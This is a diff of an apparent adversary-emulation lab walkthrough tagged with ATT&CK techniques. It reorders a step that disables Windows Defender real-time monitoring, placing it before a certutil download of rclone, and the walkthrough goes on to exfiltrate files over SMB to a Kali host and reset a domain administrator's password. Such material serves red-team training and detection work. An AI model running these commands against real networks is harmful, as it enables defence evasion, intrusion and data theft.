@@ -312,7 +312,7 @@ ATT&CK Techniques: `T1098.007`
 
 Great! We now have `AllExtendedRights` over all other users including domain administrator. This means that we can set its password which is exactly what we are going to do.
 
-You will need to close the current PowerShell window and open it again from `mimikatz` to make sure the new group membership is activated. After that, let's reset domain administrator's password.
+You will need to close the current PowerShell window and open it again from `mimikatz` to make sure the new group membership is activated. Don't forget to also re-import `a.dll`. After that, let's reset domain administrator's password.
 
 **Step 2.9**
 ```PowerShell
@@ -335,9 +335,17 @@ ATT&CK Techniques: `T1021.001` `T1078`
 
 Let's now exfiltrate them over `rclone` similarly to Part 2.
 
-We download the executable:
+But let's do one more quick additional step and disable Realtime Monitoring in Windows Defender on this system because it might complain about `rclone`:
 
 **Step 3.2**
+```PowerShell
+[FINSERVER:PowerShell] Set-MpPreference -DisableRealtimeMonitoring 1
+```
+ATT&CK Techniques: `T1562.001`
+
+We can now download the `rclone` executable:
+
+**Step 3.3**
 ```PowerShell
 [FINSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
@@ -345,7 +353,7 @@ ATT&CK Techniques: `T1005`
 
 And create a config file `C:\Temp\r.conf`:
 
-**Step 3.3**
+**Step 3.4**
 ```
 [ss]
 type = smb
@@ -360,14 +368,6 @@ Then we start the SMB server on Kali:
 ```bash
 [KALI:bash] impacket-smbserver -smb2support -username user -password pass123 data ./loot
 ```
-
-Now let's do one more quick additional **Step and disable Realtime Monitoring in Windows Defender on this system because it might complain about "suspicious rclone usage":
-
-**Step 3.4**
-```PowerShell
-[FINSERVER:PowerShell] Set-MpPreference -DisableRealtimeMonitoring 1
-```
-ATT&CK Techniques: `T1562.001`
 
 And finally we exfiltrate the files that we want:
 
